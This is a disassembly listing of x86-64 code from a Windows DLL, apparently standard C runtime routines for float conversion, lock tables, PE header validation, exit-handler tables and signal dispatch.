   18000abb9:	41 3b d1             	cmp    %r9d,%edx
   18000abbc:	74 0b                	je     0x18000abc9
   18000abbe:	ba 00 3c 00 00       	mov    $0x3c00,%edx
   18000abc3:	66 44 03 c2          	add    %dx,%r8w
   18000abc7:	eb 24                	jmp    0x18000abed
   18000abc9:	41 b8 ff 7f 00 00    	mov    $0x7fff,%r8d
   18000abcf:	eb 1c                	jmp    0x18000abed
   18000abd1:	85 c9                	test   %ecx,%ecx
   18000abd3:	75 0d                	jne    0x18000abe2
   18000abd5:	85 c0                	test   %eax,%eax
   18000abd7:	75 09                	jne    0x18000abe2
   18000abd9:	41 21 42 04          	and    %eax,0x4(%r10)
   18000abdd:	41 21 02             	and    %eax,(%r10)
   18000abe0:	eb 58                	jmp    0x18000ac3a
   18000abe2:	ba 01 3c 00 00       	mov    $0x3c01,%edx
   18000abe7:	66 44 03 c2          	add    %dx,%r8w
   18000abeb:	33 db                	xor    %ebx,%ebx
   18000abed:	44 8b c8             	mov    %eax,%r9d
   18000abf0:	c1 e1 0b             	shl    $0xb,%ecx
   18000abf3:	c1 e0 0b             	shl    $0xb,%eax
   18000abf6:	41 c1 e9 15          	shr    $0x15,%r9d
   18000abfa:	41 89 02             	mov    %eax,(%r10)
   18000abfd:	44 0b c9             	or     %ecx,%r9d
   18000ac00:	44 0b cb             	or     %ebx,%r9d
   18000ac03:	45 89 4a 04          	mov    %r9d,0x4(%r10)
   18000ac07:	45 85 c9             	test   %r9d,%r9d
   18000ac0a:	78 2a                	js     0x18000ac36
   18000ac0c:	41 8b 12             	mov    (%r10),%edx
   18000ac0f:	43 8d 04 09          	lea    (%r9,%r9,1),%eax
   18000ac13:	8b ca                	mov    %edx,%ecx
   18000ac15:	c1 e9 1f             	shr    $0x1f,%ecx
   18000ac18:	44 8b c9             	mov    %ecx,%r9d
   18000ac1b:	44 0b c8             	or     %eax,%r9d
   18000ac1e:	8d 04 12             	lea    (%rdx,%rdx,1),%eax
   18000ac21:	41 89 02             	mov    %eax,(%r10)
   18000ac24:	b8 ff ff 00 00       	mov    $0xffff,%eax
   18000ac29:	66 44 03 c0          	add    %ax,%r8w
   18000ac2d:	45 85 c9             	test   %r9d,%r9d
   18000ac30:	79 da                	jns    0x18000ac0c
   18000ac32:	45 89 4a 04          	mov    %r9d,0x4(%r10)
   18000ac36:	66 45 0b d8          	or     %r8w,%r11w
   18000ac3a:	48 8b 5c 24 08       	mov    0x8(%rsp),%rbx
   18000ac3f:	66 45 89 5a 08       	mov    %r11w,0x8(%r10)
   18000ac44:	c3                   	ret
   18000ac45:	cc                   	int3
   18000ac46:	cc                   	int3
   18000ac47:	cc                   	int3
   18000ac48:	40 55                	rex push %rbp
   18000ac4a:	53                   	push   %rbx
   18000ac4b:	56                   	push   %rsi
   18000ac4c:	57                   	push   %rdi
   18000ac4d:	48 8d 6c 24 c1       	lea    -0x3f(%rsp),%rbp
   18000ac52:	48 81 ec 88 00 00 00 	sub    $0x88,%rsp
   18000ac59:	48 8b 05 a0 e3 00 00 	mov    0xe3a0(%rip),%rax        # 0x180019000
   18000ac60:	48 33 c4             	xor    %rsp,%rax
   18000ac63:	48 89 45 27          	mov    %rax,0x27(%rbp)
   18000ac67:	48 8b fa             	mov    %rdx,%rdi
   18000ac6a:	48 89 4d e7          	mov    %rcx,-0x19(%rbp)
   18000ac6e:	48 8d 55 e7          	lea    -0x19(%rbp),%rdx
   18000ac72:	48 8d 4d f7          	lea    -0x9(%rbp),%rcx
   18000ac76:	49 8b d9             	mov    %r9,%rbx
   18000ac79:	49 8b f0             	mov    %r8,%rsi
   18000ac7c:	e8 f7 fe ff ff       	call   0x18000ab78
   18000ac81:	0f b7 45 ff          	movzwl -0x1(%rbp),%eax
   18000ac85:	45 33 c0             	xor    %r8d,%r8d
   18000ac88:	f2 0f 10 45 f7       	movsd  -0x9(%rbp),%xmm0
   18000ac8d:	f2 0f 11 45 e7       	movsd  %xmm0,-0x19(%rbp)
   18000ac92:	4c 8d 4d 07          	lea    0x7(%rbp),%r9
   18000ac96:	48 8d 4d e7          	lea    -0x19(%rbp),%rcx
   18000ac9a:	41 8d 50 11          	lea    0x11(%r8),%edx
   18000ac9e:	66 89 45 ef          	mov    %ax,-0x11(%rbp)
   18000aca2:	e8 75 32 00 00       	call   0x18000df1c
   18000aca7:	0f be 4d 09          	movsbl 0x9(%rbp),%ecx
   18000acab:	89 0f                	mov    %ecx,(%rdi)
   18000acad:	0f bf 4d 07          	movswl 0x7(%rbp),%ecx
   18000acb1:	4c 8d 45 0b          	lea    0xb(%rbp),%r8
   18000acb5:	89 4f 04             	mov    %ecx,0x4(%rdi)
   18000acb8:	48 8b d3             	mov    %rbx,%rdx
   18000acbb:	48 8b ce             	mov    %rsi,%rcx
   18000acbe:	89 47 08             	mov    %eax,0x8(%rdi)
   18000acc1:	e8 56 a8 ff ff       	call   0x18000551c
   18000acc6:	85 c0                	test   %eax,%eax
   18000acc8:	75 1f                	jne    0x18000ace9
   18000acca:	48 89 77 10          	mov    %rsi,0x10(%rdi)
   18000acce:	48 8b c7             	mov    %rdi,%rax
   18000acd1:	48 8b 4d 27          	mov    0x27(%rbp),%rcx
   18000acd5:	48 33 cc             	xor    %rsp,%rcx
   18000acd8:	e8 53 a5 ff ff       	call   0x180005230
   18000acdd:	48 81 c4 88 00 00 00 	add    $0x88,%rsp
   18000ace4:	5f                   	pop    %rdi
   18000ace5:	5e                   	pop    %rsi
   18000ace6:	5b                   	pop    %rbx
   18000ace7:	5d                   	pop    %rbp
   18000ace8:	c3                   	ret
   18000ace9:	48 83 64 24 20 00    	andq   $0x0,0x20(%rsp)
   18000acef:	45 33 c9             	xor    %r9d,%r9d
   18000acf2:	45 33 c0             	xor    %r8d,%r8d
   18000acf5:	33 d2                	xor    %edx,%edx
   18000acf7:	33 c9                	xor    %ecx,%ecx
   18000acf9:	e8 86 c8 ff ff       	call   0x180007584
   18000acfe:	cc                   	int3
   18000acff:	cc                   	int3
   18000ad00:	b9 02 00 00 00       	mov    $0x2,%ecx
   18000ad05:	e9 a2 cb ff ff       	jmp    0x1800078ac
   18000ad0a:	cc                   	int3
   18000ad0b:	cc                   	int3
   18000ad0c:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   18000ad11:	57                   	push   %rdi
   18000ad12:	48 83 ec 20          	sub    $0x20,%rsp
   18000ad16:	48 63 d9             	movslq %ecx,%rbx
   18000ad19:	48 8d 3d d0 ee 00 00 	lea    0xeed0(%rip),%rdi        # 0x180019bf0
   18000ad20:	48 03 db             	add    %rbx,%rbx
   18000ad23:	48 83 3c df 00       	cmpq   $0x0,(%rdi,%rbx,8)
   18000ad28:	75 11                	jne    0x18000ad3b
   18000ad2a:	e8 a9 00 00 00       	call   0x18000add8
   18000ad2f:	85 c0                	test   %eax,%eax
   18000ad31:	75 08                	jne    0x18000ad3b
   18000ad33:	8d 48 11             	lea    0x11(%rax),%ecx
   18000ad36:	e8 71 cb ff ff       	call   0x1800078ac
   18000ad3b:	48 8b 0c df          	mov    (%rdi,%rbx,8),%rcx
   18000ad3f:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   18000ad44:	48 83 c4 20          	add    $0x20,%rsp
   18000ad48:	5f                   	pop    %rdi
   18000ad49:	48 ff 25 90 64 00 00 	rex.W jmp *0x6490(%rip)        # 0x1800111e0
   18000ad50:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   18000ad55:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   18000ad5a:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   18000ad5f:	57                   	push   %rdi
   18000ad60:	48 83 ec 20          	sub    $0x20,%rsp
   18000ad64:	bf 24 00 00 00       	mov    $0x24,%edi
   18000ad69:	48 8d 1d 80 ee 00 00 	lea    0xee80(%rip),%rbx        # 0x180019bf0
   18000ad70:	8b ef                	mov    %edi,%ebp
   18000ad72:	48 8b 33             	mov    (%rbx),%rsi
   18000ad75:	48 85 f6             	test   %rsi,%rsi
   18000ad78:	74 1b                	je     0x18000ad95
   18000ad7a:	83 7b 08 01          	cmpl   $0x1,0x8(%rbx)
   18000ad7e:	74 15                	je     0x18000ad95
   18000ad80:	48 8b ce             	mov    %rsi,%rcx
   18000ad83:	ff 15 a7 63 00 00    	call   *0x63a7(%rip)        # 0x180011130
   18000ad89:	48 8b ce             	mov    %rsi,%rcx
   18000ad8c:	e8 ef a7 ff ff       	call   0x180005580
   18000ad91:	48 83 23 00          	andq   $0x0,(%rbx)
   18000ad95:	48 83 c3 10          	add    $0x10,%rbx
   18000ad99:	48 ff cd             	dec    %rbp
   18000ad9c:	75 d4                	jne    0x18000ad72
   18000ad9e:	48 8d 1d 53 ee 00 00 	lea    0xee53(%rip),%rbx        # 0x180019bf8
   18000ada5:	48 8b 4b f8          	mov    -0x8(%rbx),%rcx
   18000ada9:	48 85 c9             	test   %rcx,%rcx
   18000adac:	74 0b                	je     0x18000adb9
   18000adae:	83 3b 01             	cmpl   $0x1,(%rbx)
   18000adb1:	75 06                	jne    0x18000adb9
   18000adb3:	ff 15 77 63 00 00    	call   *0x6377(%rip)        # 0x180011130
   18000adb9:	48 83 c3 10          	add    $0x10,%rbx
   18000adbd:	48 ff cf             	dec    %rdi
   18000adc0:	75 e3                	jne    0x18000ada5
   18000adc2:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   18000adc7:	48 8b 6c 24 38       	mov    0x38(%rsp),%rbp
   18000adcc:	48 8b 74 24 40       	mov    0x40(%rsp),%rsi
   18000add1:	48 83 c4 20          	add    $0x20,%rsp
   18000add5:	5f                   	pop    %rdi
   18000add6:	c3                   	ret
   18000add7:	cc                   	int3
   18000add8:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   18000addd:	48 89 7c 24 10       	mov    %rdi,0x10(%rsp)
   18000ade2:	41 56                	push   %r14
   18000ade4:	48 83 ec 20          	sub    $0x20,%rsp
   18000ade8:	48 63 d9             	movslq %ecx,%rbx
   18000adeb:	48 83 3d ad ff 00 00 	cmpq   $0x0,0xffad(%rip)        # 0x18001ada0
   18000adf2:	00 
   18000adf3:	75 19                	jne    0x18000ae0e
   18000adf5:	e8 26 ce ff ff       	call   0x180007c20
   18000adfa:	b9 1e 00 00 00       	mov    $0x1e,%ecx
   18000adff:	e8 90 ce ff ff       	call   0x180007c94
   18000ae04:	b9 ff 00 00 00       	mov    $0xff,%ecx
   18000ae09:	e8 3e c9 ff ff       	call   0x18000774c
   18000ae0e:	48 03 db             	add    %rbx,%rbx
   18000ae11:	4c 8d 35 d8 ed 00 00 	lea    0xedd8(%rip),%r14        # 0x180019bf0
   18000ae18:	49 83 3c de 00       	cmpq   $0x0,(%r14,%rbx,8)
   18000ae1d:	74 07                	je     0x18000ae26
   18000ae1f:	b8 01 00 00 00       	mov    $0x1,%eax
   18000ae24:	eb 5e                	jmp    0x18000ae84
   18000ae26:	b9 28 00 00 00       	mov    $0x28,%ecx
   18000ae2b:	e8 94 f3 ff ff       	call   0x18000a1c4
   18000ae30:	48 8b f8             	mov    %rax,%rdi
   18000ae33:	48 85 c0             	test   %rax,%rax
   18000ae36:	75 0f                	jne    0x18000ae47
   18000ae38:	e8 f3 c7 ff ff       	call   0x180007630
   18000ae3d:	c7 00 0c 00 00 00    	movl   $0xc,(%rax)
   18000ae43:	33 c0                	xor    %eax,%eax
   18000ae45:	eb 3d                	jmp    0x18000ae84
   18000ae47:	b9 0a 00 00 00       	mov    $0xa,%ecx
   18000ae4c:	e8 bb fe ff ff       	call   0x18000ad0c
   18000ae51:	90                   	nop
   18000ae52:	48 8b cf             	mov    %rdi,%rcx
   18000ae55:	49 83 3c de 00       	cmpq   $0x0,(%r14,%rbx,8)
   18000ae5a:	75 13                	jne    0x18000ae6f
   18000ae5c:	45 33 c0             	xor    %r8d,%r8d
   18000ae5f:	ba a0 0f 00 00       	mov    $0xfa0,%edx
   18000ae64:	e8 1f ee ff ff       	call   0x180009c88
   18000ae69:	49 89 3c de          	mov    %rdi,(%r14,%rbx,8)
   18000ae6d:	eb 06                	jmp    0x18000ae75
   18000ae6f:	e8 0c a7 ff ff       	call   0x180005580
   18000ae74:	90                   	nop
   18000ae75:	48 8b 0d 14 ee 00 00 	mov    0xee14(%rip),%rcx        # 0x180019c90
   18000ae7c:	ff 15 66 63 00 00    	call   *0x6366(%rip)        # 0x1800111e8
   18000ae82:	eb 9b                	jmp    0x18000ae1f
   18000ae84:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   18000ae89:	48 8b 7c 24 38       	mov    0x38(%rsp),%rdi
   18000ae8e:	48 83 c4 20          	add    $0x20,%rsp
   18000ae92:	41 5e                	pop    %r14
   18000ae94:	c3                   	ret
   18000ae95:	cc                   	int3
   18000ae96:	cc                   	int3
   18000ae97:	cc                   	int3
   18000ae98:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   18000ae9d:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   18000aea2:	57                   	push   %rdi
   18000aea3:	48 83 ec 20          	sub    $0x20,%rsp
   18000aea7:	33 f6                	xor    %esi,%esi
   18000aea9:	48 8d 1d 40 ed 00 00 	lea    0xed40(%rip),%rbx        # 0x180019bf0
   18000aeb0:	8d 7e 24             	lea    0x24(%rsi),%edi
   18000aeb3:	83 7b 08 01          	cmpl   $0x1,0x8(%rbx)
   18000aeb7:	75 24                	jne    0x18000aedd
   18000aeb9:	48 63 c6             	movslq %esi,%rax
   18000aebc:	48 8d 15 cd 08 01 00 	lea    0x108cd(%rip),%rdx        # 0x18001b790
   18000aec3:	45 33 c0             	xor    %r8d,%r8d
   18000aec6:	48 8d 0c 80          	lea    (%rax,%rax,4),%rcx
   18000aeca:	ff c6                	inc    %esi
   18000aecc:	48 8d 0c ca          	lea    (%rdx,%rcx,8),%rcx
   18000aed0:	ba a0 0f 00 00       	mov    $0xfa0,%edx
   18000aed5:	48 89 0b             	mov    %rcx,(%rbx)
   18000aed8:	e8 ab ed ff ff       	call   0x180009c88
   18000aedd:	48 83 c3 10          	add    $0x10,%rbx
   18000aee1:	48 ff cf             	dec    %rdi
   18000aee4:	75 cd                	jne    0x18000aeb3
   18000aee6:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   18000aeeb:	48 8b 74 24 38       	mov    0x38(%rsp),%rsi
   18000aef0:	8d 47 01             	lea    0x1(%rdi),%eax
   18000aef3:	48 83 c4 20          	add    $0x20,%rsp
   18000aef7:	5f                   	pop    %rdi
   18000aef8:	c3                   	ret
   18000aef9:	cc                   	int3
   18000aefa:	cc                   	int3
   18000aefb:	cc                   	int3
   18000aefc:	48 63 c9             	movslq %ecx,%rcx
   18000aeff:	48 8d 05 ea ec 00 00 	lea    0xecea(%rip),%rax        # 0x180019bf0
   18000af06:	48 03 c9             	add    %rcx,%rcx
   18000af09:	48 8b 0c c8          	mov    (%rax,%rcx,8),%rcx
   18000af0d:	48 ff 25 d4 62 00 00 	rex.W jmp *0x62d4(%rip)        # 0x1800111e8
   18000af14:	cc                   	int3
   18000af15:	cc                   	int3
   18000af16:	cc                   	int3
   18000af17:	cc                   	int3
   18000af18:	cc                   	int3
   18000af19:	cc                   	int3
   18000af1a:	cc                   	int3
   18000af1b:	cc                   	int3
   18000af1c:	cc                   	int3
   18000af1d:	cc                   	int3
   18000af1e:	cc                   	int3
   18000af1f:	cc                   	int3
   18000af20:	4c 63 41 3c          	movslq 0x3c(%rcx),%r8
   18000af24:	45 33 c9             	xor    %r9d,%r9d
   18000af27:	4c 8b d2             	mov    %rdx,%r10
   18000af2a:	4c 03 c1             	add    %rcx,%r8
   18000af2d:	41 0f b7 40 14       	movzwl 0x14(%r8),%eax
   18000af32:	45 0f b7 58 06       	movzwl 0x6(%r8),%r11d
   18000af37:	48 83 c0 18          	add    $0x18,%rax
   18000af3b:	49 03 c0             	add    %r8,%rax
   18000af3e:	45 85 db             	test   %r11d,%r11d
   18000af41:	74 1e                	je     0x18000af61
   18000af43:	8b 50 0c             	mov    0xc(%rax),%edx
   18000af46:	4c 3b d2             	cmp    %rdx,%r10
   18000af49:	72 0a                	jb     0x18000af55
   18000af4b:	8b 48 08             	mov    0x8(%rax),%ecx
   18000af4e:	03 ca                	add    %edx,%ecx
   18000af50:	4c 3b d1             	cmp    %rcx,%r10
   18000af53:	72 0e                	jb     0x18000af63
   18000af55:	41 ff c1             	inc    %r9d
   18000af58:	48 83 c0 28          	add    $0x28,%rax
   18000af5c:	45 3b cb             	cmp    %r11d,%r9d
   18000af5f:	72 e2                	jb     0x18000af43
   18000af61:	33 c0                	xor    %eax,%eax
   18000af63:	c3                   	ret
   18000af64:	cc                   	int3
   18000af65:	cc                   	int3
   18000af66:	cc                   	int3
   18000af67:	cc                   	int3
   18000af68:	cc                   	int3
   18000af69:	cc                   	int3
   18000af6a:	cc                   	int3
   18000af6b:	cc                   	int3
   18000af6c:	cc                   	int3
   18000af6d:	cc                   	int3
   18000af6e:	cc                   	int3
   18000af6f:	cc                   	int3
   18000af70:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   18000af75:	57                   	push   %rdi
   18000af76:	48 83 ec 20          	sub    $0x20,%rsp
   18000af7a:	48 8b d9             	mov    %rcx,%rbx
   18000af7d:	48 8d 3d 7c 50 ff ff 	lea    -0xaf84(%rip),%rdi        # 0x180000000
   18000af84:	48 8b cf             	mov    %rdi,%rcx
   18000af87:	e8 34 00 00 00       	call   0x18000afc0
   18000af8c:	85 c0                	test   %eax,%eax
   18000af8e:	74 22                	je     0x18000afb2
   18000af90:	48 2b df             	sub    %rdi,%rbx
   18000af93:	48 8b d3             	mov    %rbx,%rdx
   18000af96:	48 8b cf             	mov    %rdi,%rcx
   18000af99:	e8 82 ff ff ff       	call   0x18000af20
   18000af9e:	48 85 c0             	test   %rax,%rax
   18000afa1:	74 0f                	je     0x18000afb2
   18000afa3:	8b 40 24             	mov    0x24(%rax),%eax
   18000afa6:	c1 e8 1f             	shr    $0x1f,%eax
   18000afa9:	f7 d0                	not    %eax
   18000afab:	83 e0 01             	and    $0x1,%eax
   18000afae:	eb 02                	jmp    0x18000afb2
   18000afb0:	33 c0                	xor    %eax,%eax
   18000afb2:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   18000afb7:	48 83 c4 20          	add    $0x20,%rsp
   18000afbb:	5f                   	pop    %rdi
   18000afbc:	c3                   	ret
   18000afbd:	cc                   	int3
   18000afbe:	cc                   	int3
   18000afbf:	cc                   	int3
   18000afc0:	48 8b c1             	mov    %rcx,%rax
   18000afc3:	b9 4d 5a 00 00       	mov    $0x5a4d,%ecx
   18000afc8:	66 39 08             	cmp    %cx,(%rax)
   18000afcb:	74 03                	je     0x18000afd0
   18000afcd:	33 c0                	xor    %eax,%eax
   18000afcf:	c3                   	ret
   18000afd0:	48 63 48 3c          	movslq 0x3c(%rax),%rcx
   18000afd4:	48 03 c8             	add    %rax,%rcx
   18000afd7:	33 c0                	xor    %eax,%eax
   18000afd9:	81 39 50 45 00 00    	cmpl   $0x4550,(%rcx)
   18000afdf:	75 0c                	jne    0x18000afed
   18000afe1:	ba 0b 02 00 00       	mov    $0x20b,%edx
   18000afe6:	66 39 51 18          	cmp    %dx,0x18(%rcx)
   18000afea:	0f 94 c0             	sete   %al
   18000afed:	c3                   	ret
   18000afee:	cc                   	int3
   18000afef:	cc                   	int3
   18000aff0:	40 53                	rex push %rbx
   18000aff2:	48 83 ec 20          	sub    $0x20,%rsp
   18000aff6:	ba 08 00 00 00       	mov    $0x8,%edx
   18000affb:	8d 4a 18             	lea    0x18(%rdx),%ecx
   18000affe:	e8 41 f1 ff ff       	call   0x18000a144
   18000b003:	48 8b c8             	mov    %rax,%rcx
   18000b006:	48 8b d8             	mov    %rax,%rbx
   18000b009:	ff 15 a1 60 00 00    	call   *0x60a1(%rip)        # 0x1800110b0
   18000b00f:	48 89 05 aa 1b 01 00 	mov    %rax,0x11baa(%rip)        # 0x18001cbc0
   18000b016:	48 89 05 9b 1b 01 00 	mov    %rax,0x11b9b(%rip)        # 0x18001cbb8
   18000b01d:	48 85 db             	test   %rbx,%rbx
   18000b020:	75 05                	jne    0x18000b027
   18000b022:	8d 43 18             	lea    0x18(%rbx),%eax
   18000b025:	eb 06                	jmp    0x18000b02d
   18000b027:	48 83 23 00          	andq   $0x0,(%rbx)
   18000b02b:	33 c0                	xor    %eax,%eax
   18000b02d:	48 83 c4 20          	add    $0x20,%rsp
   18000b031:	5b                   	pop    %rbx
   18000b032:	c3                   	ret
   18000b033:	cc                   	int3
   18000b034:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   18000b039:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   18000b03e:	48 89 7c 24 18       	mov    %rdi,0x18(%rsp)
   18000b043:	41 54                	push   %r12
   18000b045:	41 56                	push   %r14
   18000b047:	41 57                	push   %r15
   18000b049:	48 83 ec 20          	sub    $0x20,%rsp
   18000b04d:	4c 8b e1             	mov    %rcx,%r12
   18000b050:	e8 1b ca ff ff       	call   0x180007a70
   18000b055:	90                   	nop
   18000b056:	48 8b 0d 63 1b 01 00 	mov    0x11b63(%rip),%rcx        # 0x18001cbc0
   18000b05d:	ff 15 55 60 00 00    	call   *0x6055(%rip)        # 0x1800110b8
   18000b063:	4c 8b f0             	mov    %rax,%r14
   18000b066:	48 8b 0d 4b 1b 01 00 	mov    0x11b4b(%rip),%rcx        # 0x18001cbb8
   18000b06d:	ff 15 45 60 00 00    	call   *0x6045(%rip)        # 0x1800110b8
   18000b073:	48 8b d8             	mov    %rax,%rbx
   18000b076:	49 3b c6             	cmp    %r14,%rax
   18000b079:	0f 82 9b 00 00 00    	jb     0x18000b11a
   18000b07f:	48 8b f8             	mov    %rax,%rdi
   18000b082:	49 2b fe             	sub    %r14,%rdi
   18000b085:	4c 8d 7f 08          	lea    0x8(%rdi),%r15
   18000b089:	49 83 ff 08          	cmp    $0x8,%r15
   18000b08d:	0f 82 87 00 00 00    	jb     0x18000b11a
   18000b093:	49 8b ce             	mov    %r14,%rcx
   18000b096:	e8 59 39 00 00       	call   0x18000e9f4
   18000b09b:	48 8b f0             	mov    %rax,%rsi
   18000b09e:	49 3b c7             	cmp    %r15,%rax
   18000b0a1:	73 55                	jae    0x18000b0f8
   18000b0a3:	ba 00 10 00 00       	mov    $0x1000,%edx
   18000b0a8:	48 3b c2             	cmp    %rdx,%rax
   18000b0ab:	48 0f 42 d0          	cmovb  %rax,%rdx
   18000b0af:	48 03 d0             	add    %rax,%rdx
   18000b0b2:	48 3b d0             	cmp    %rax,%rdx
   18000b0b5:	72 11                	jb     0x18000b0c8
   18000b0b7:	49 8b ce             	mov    %r14,%rcx
   18000b0ba:	e8 81 f1 ff ff       	call   0x18000a240
   18000b0bf:	33 db                	xor    %ebx,%ebx
   18000b0c1:	48 85 c0             	test   %rax,%rax
   18000b0c4:	75 1a                	jne    0x18000b0e0
   18000b0c6:	eb 02                	jmp    0x18000b0ca
   18000b0c8:	33 db                	xor    %ebx,%ebx
   18000b0ca:	48 8d 56 20          	lea    0x20(%rsi),%rdx
   18000b0ce:	48 3b d6             	cmp    %rsi,%rdx
   18000b0d1:	72 49                	jb     0x18000b11c
   18000b0d3:	49 8b ce             	mov    %r14,%rcx
   18000b0d6:	e8 65 f1 ff ff       	call   0x18000a240
   18000b0db:	48 85 c0             	test   %rax,%rax
   18000b0de:	74 3c                	je     0x18000b11c
   18000b0e0:	48 c1 ff 03          	sar    $0x3,%rdi
   18000b0e4:	48 8d 1c f8          	lea    (%rax,%rdi,8),%rbx
   18000b0e8:	48 8b c8             	mov    %rax,%rcx
   18000b0eb:	ff 15 bf 5f 00 00    	call   *0x5fbf(%rip)        # 0x1800110b0
   18000b0f1:	48 89 05 c8 1a 01 00 	mov    %rax,0x11ac8(%rip)        # 0x18001cbc0
   18000b0f8:	49 8b cc             	mov    %r12,%rcx
   18000b0fb:	ff 15 af 5f 00 00    	call   *0x5faf(%rip)        # 0x1800110b0
   18000b101:	48 89 03             	mov    %rax,(%rbx)
   18000b104:	48 8d 4b 08          	lea    0x8(%rbx),%rcx
   18000b108:	ff 15 a2 5f 00 00    	call   *0x5fa2(%rip)        # 0x1800110b0
   18000b10e:	48 89 05 a3 1a 01 00 	mov    %rax,0x11aa3(%rip)        # 0x18001cbb8
   18000b115:	49 8b dc             	mov    %r12,%rbx
   18000b118:	eb 02                	jmp    0x18000b11c
   18000b11a:	33 db                	xor    %ebx,%ebx
   18000b11c:	e8 5b c9 ff ff       	call   0x180007a7c
   18000b121:	48 8b c3             	mov    %rbx,%rax
   18000b124:	48 8b 5c 24 40       	mov    0x40(%rsp),%rbx
   18000b129:	48 8b 74 24 48       	mov    0x48(%rsp),%rsi
   18000b12e:	48 8b 7c 24 50       	mov    0x50(%rsp),%rdi
   18000b133:	48 83 c4 20          	add    $0x20,%rsp
   18000b137:	41 5f                	pop    %r15
   18000b139:	41 5e                	pop    %r14
   18000b13b:	41 5c                	pop    %r12
   18000b13d:	c3                   	ret
   18000b13e:	cc                   	int3
   18000b13f:	cc                   	int3
   18000b140:	48 83 ec 28          	sub    $0x28,%rsp
   18000b144:	e8 eb fe ff ff       	call   0x18000b034
   18000b149:	48 f7 d8             	neg    %rax
   18000b14c:	1b c0                	sbb    %eax,%eax
   18000b14e:	f7 d8                	neg    %eax
   18000b150:	ff c8                	dec    %eax
   18000b152:	48 83 c4 28          	add    $0x28,%rsp
   18000b156:	c3                   	ret
   18000b157:	cc                   	int3
   18000b158:	48 83 ec 28          	sub    $0x28,%rsp
   18000b15c:	e8 5f dc ff ff       	call   0x180008dc0
   18000b161:	48 8b 88 d0 00 00 00 	mov    0xd0(%rax),%rcx
   18000b168:	48 85 c9             	test   %rcx,%rcx
   18000b16b:	74 04                	je     0x18000b171
   18000b16d:	ff d1                	call   *%rcx
   18000b16f:	eb 00                	jmp    0x18000b171
   18000b171:	e8 ba 38 00 00       	call   0x18000ea30
   18000b176:	90                   	nop
   18000b177:	cc                   	int3
   18000b178:	48 83 ec 28          	sub    $0x28,%rsp
   18000b17c:	48 8d 0d d5 ff ff ff 	lea    -0x2b(%rip),%rcx        # 0x18000b158
   18000b183:	ff 15 27 5f 00 00    	call   *0x5f27(%rip)        # 0x1800110b0
   18000b189:	48 89 05 30 08 01 00 	mov    %rax,0x10830(%rip)        # 0x18001b9c0
   18000b190:	48 83 c4 28          	add    $0x28,%rsp
   18000b194:	c3                   	ret
   18000b195:	cc                   	int3
   18000b196:	cc                   	int3
   18000b197:	cc                   	int3
   18000b198:	48 89 0d 29 08 01 00 	mov    %rcx,0x10829(%rip)        # 0x18001b9c8
   18000b19f:	c3                   	ret
   18000b1a0:	48 8b 0d 39 08 01 00 	mov    0x10839(%rip),%rcx        # 0x18001b9e0
   18000b1a7:	48 ff 25 0a 5f 00 00 	rex.W jmp *0x5f0a(%rip)        # 0x1800110b8
   18000b1ae:	cc                   	int3
   18000b1af:	cc                   	int3
   18000b1b0:	48 89 0d 19 08 01 00 	mov    %rcx,0x10819(%rip)        # 0x18001b9d0
   18000b1b7:	48 89 0d 1a 08 01 00 	mov    %rcx,0x1081a(%rip)        # 0x18001b9d8
   18000b1be:	48 89 0d 1b 08 01 00 	mov    %rcx,0x1081b(%rip)        # 0x18001b9e0
   18000b1c5:	48 89 0d 1c 08 01 00 	mov    %rcx,0x1081c(%rip)        # 0x18001b9e8
   18000b1cc:	c3                   	ret
   18000b1cd:	cc                   	int3
   18000b1ce:	cc                   	int3
   18000b1cf:	cc                   	int3
   18000b1d0:	48 89 5c 24 18       	mov    %rbx,0x18(%rsp)
   18000b1d5:	48 89 74 24 20       	mov    %rsi,0x20(%rsp)
   18000b1da:	57                   	push   %rdi
   18000b1db:	41 54                	push   %r12
   18000b1dd:	41 55                	push   %r13
   18000b1df:	41 56                	push   %r14
   18000b1e1:	41 57                	push   %r15
   18000b1e3:	48 83 ec 30          	sub    $0x30,%rsp
   18000b1e7:	8b d9                	mov    %ecx,%ebx
   18000b1e9:	45 33 ed             	xor    %r13d,%r13d
   18000b1ec:	44 21 6c 24 68       	and    %r13d,0x68(%rsp)
   18000b1f1:	33 ff                	xor    %edi,%edi
   18000b1f3:	89 7c 24 60          	mov    %edi,0x60(%rsp)
   18000b1f7:	33 f6                	xor    %esi,%esi
   18000b1f9:	8b d1                	mov    %ecx,%edx
   18000b1fb:	83 ea 02             	sub    $0x2,%edx
   18000b1fe:	0f 84 c4 00 00 00    	je     0x18000b2c8
   18000b204:	83 ea 02             	sub    $0x2,%edx
   18000b207:	74 62                	je     0x18000b26b
   18000b209:	83 ea 02             	sub    $0x2,%edx
   18000b20c:	74 4d                	je     0x18000b25b
   18000b20e:	83 ea 02             	sub    $0x2,%edx
   18000b211:	74 58                	je     0x18000b26b
   18000b213:	83 ea 03             	sub    $0x3,%edx
   18000b216:	74 53                	je     0x18000b26b
   18000b218:	83 ea 04             	sub    $0x4,%edx
   18000b21b:	74 2e                	je     0x18000b24b
   18000b21d:	83 ea 06             	sub    $0x6,%edx
   18000b220:	74 16                	je     0x18000b238
   18000b222:	ff ca                	dec    %edx
   18000b224:	74 35                	je     0x18000b25b
   18000b226:	e8 05 c4 ff ff       	call   0x180007630
   18000b22b:	c7 00 16 00 00 00    	movl   $0x16,(%rax)
   18000b231:	e8 2e c3 ff ff       	call   0x180007564
   18000b236:	eb 40                	jmp    0x18000b278
   18000b238:	4c 8d 35 99 07 01 00 	lea    0x10799(%rip),%r14        # 0x18001b9d8
   18000b23f:	48 8b 0d 92 07 01 00 	mov    0x10792(%rip),%rcx        # 0x18001b9d8
   18000b246:	e9 8b 00 00 00       	jmp    0x18000b2d6
